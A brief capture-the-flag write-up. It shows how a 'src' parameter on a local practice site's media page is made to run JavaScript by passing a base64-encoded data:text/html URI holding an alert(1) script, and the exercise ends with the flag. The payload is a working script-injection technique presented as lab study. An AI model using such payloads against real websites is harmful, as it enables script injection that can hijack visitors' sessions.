On the NSA logo there is an href tag thats redirect to : http://localhost:8080/index.php?page=media&src=nsa

We gonna modify the src param to execute JS code
The goal here is to exec an alert(1) in the page, to do so we first need the script in base64 :
=> <script>alert(1);</script>
=> to base64 = PHNjcmlwdD5hbGVydCgxKTs8L3NjcmlwdD4=

Now let's create our payload : data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTs8L3NjcmlwdD4=

Then let's give our payload to the src param : http://localhost:8080/index.php?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTs8L3NjcmlwdD4=

We have our flag !
